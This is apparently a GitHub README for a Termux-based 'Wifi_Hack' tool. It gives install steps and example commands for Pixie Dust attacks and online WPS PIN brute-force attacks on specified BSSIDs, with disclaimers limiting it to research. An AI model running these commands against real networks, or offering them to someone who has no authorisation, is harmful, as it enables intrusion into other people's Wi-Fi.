# Wifi_Hack
- WPS Attack Tool  A Python-based security tool for testing WPS-enabled Wi-Fi networks. Supports Pixie Dust attacks, brute-force PIN attempts, and network enumeration. Designed for penetration testers and researchers.  ⚠ ### ⚠ Disclaimer:
- This tool is for educational and security research purposes only. Unauthorized use on networks you do not own is illegal.


### Hack WIfi Using Termux With Rooted Devices!

<p align="center"><img src="https://i.ibb.co.com/whCnGHbr/Picsart-25-04-01-12-35-57-709-1.jpg"></p>

### Installation:  

```bash
$ apt update && apt upgrade
$ pkg install -y root-repo
$ pkg install -y git tsu python wpa-supplicant pixiewps iw
$ git clone https://github.com/ruhul-amin-xxl/Wifi_Hack
$ cd Wifi_Hack
$ chmod +x Wifi_Hack.py
$ sudo python Wifi_Hack.py --help
```
Example:
### Note:First,  turn off your Wi-Fi.

Show available networks and start a Pixie Dust attack on a specified network: 

```bash
sudo python Wifi_Hack.py -i wlan0 -K
```


Start a Pixie Dust attack on a specific BSSID:

```bash
sudo python Wifi_Hack.py -i wlan0 -b 00:91:4C:C3:AC:28 -K
```
Launch an online WPS brute-force attack with the specified first half of the PIN:

```bash
sudo python Wifi_Hack.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
```

### Troubleshooting
"Device or resource busy (-16)"
- Solution: Turn Wi-Fi ON, then turn it OFF before running the script again.

### ⚠ Disclaimer:
- This tool is for educational and security research purposes only. Unauthorized use on networks you do not own is illegal.
